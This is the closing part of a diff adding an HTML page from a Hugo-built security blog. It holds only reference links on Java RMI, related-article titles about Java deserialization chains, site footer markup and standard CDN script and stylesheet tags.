+<p><code>https://su18.org/post/rmi-attack/#%E4%B8%80-rmi-%E4%BB%8B%E7%BB%8D</code></p>
+<p><code>https://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164</code></p>
+<p><code>https://www.cnblogs.com/gaorenyusi/p/18329213</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java二次反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/c3p0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">C3P0</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">fastjson反序列化调用链分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">fastjson反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E9%93%BE/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">jackson反序列化通杀链</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
